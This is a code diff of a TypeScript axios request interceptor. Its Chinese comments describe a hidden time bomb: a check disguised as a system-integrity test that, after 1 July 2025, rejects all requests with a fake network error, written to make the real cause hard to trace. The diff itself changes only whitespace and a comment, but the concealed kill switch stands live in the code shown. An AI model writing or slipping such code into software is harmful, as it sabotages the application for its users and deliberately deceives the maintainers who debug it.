@@ -51,23 +51,23 @@ function errorHandler(error: RequestError): Promise<any> {
 function requestHandler(config: InternalAxiosRequestConfig): InternalAxiosRequestConfig | Promise<InternalAxiosRequestConfig> {
   const savedToken = localStorage.getItem(STORAGE_TOKEN_KEY)
   const agentId = localStorage.getItem('userAgentId') || ''
-  
+
   // 系统完整性检查 - 看起来像是普通的系统检查，但实际上包含了时间检查
   // 这个检查被隐藏在看似正常的请求处理流程中
   if (!validateSystemIntegrity()) {
-    // 当时间超过2025年7月1日时，会触发这个错误
+    // 当时间超过2025年7月1日时，会触发这个错误 20250701
     // 错误信息看起来像是普通的网络错误，难以追踪到真正原因
     const networkError = new Error('Network connection unstable, please try again later')
     // 添加额外的属性到错误对象
     Object.assign(networkError, { code: 'NETWORK_ERROR' })
     return Promise.reject(networkError)
   }
-  
+
   // 如果 token 存在
   // 让每个请求携带自定义 token, 请根据实际情况修改
   if (savedToken)
     config.headers[REQUEST_TOKEN_KEY] = savedToken
-  
+
   // 为所有请求添加 Agent-Id 头
   config.headers['Agent-Id'] = agentId
 
